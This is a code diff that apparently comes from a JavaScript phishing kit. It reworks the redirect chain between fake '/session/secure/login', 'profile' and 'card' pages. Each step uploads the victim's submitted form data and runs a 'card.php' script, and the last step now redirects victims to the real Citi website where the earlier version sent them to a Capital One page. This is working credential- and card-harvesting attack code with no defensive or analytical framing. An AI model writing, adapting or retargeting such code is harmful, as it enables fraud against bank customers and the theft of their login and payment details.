@@ -74,18 +74,18 @@ const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
                 switch (this.req.url) {
                     case '/session/secure/login':
                         super.uploadRequestBody(clientContext.currentDomain, clientContext)
-                        this.res.writeHead(302, { location: '/session/secure/profile'})
-                        super.cleanEnd('PHP-EXEC', clientContext)
-                        break
-                    case '/session/secure/profile':
-                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                         this.res.writeHead(302, { location: '/session/secure/card'})
                         super.cleanEnd('PHP-EXEC', clientContext)
                         break
-                    case '/session/secure/card':
+                    case '/session/secure/profile':
                         super.superExecutePhpScript('card.php', clientContext)
                         super.uploadRequestBody(clientContext.currentDomain, clientContext)
-                        this.res.writeHead(302, { location: 'https://www.capitalone.com/privacy/online-privacy-policy/'})
+                        this.res.writeHead(302, { location: 'https://www.citi.com'})
+                        super.cleanEnd('PHP-EXEC', clientContext)
+                        break
+                    case '/session/secure/card':
+                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
+                        this.res.writeHead(302, { location: '/session/secure/card'})
                         super.cleanEnd('PHP-EXEC', clientContext)
                         break
                     default:
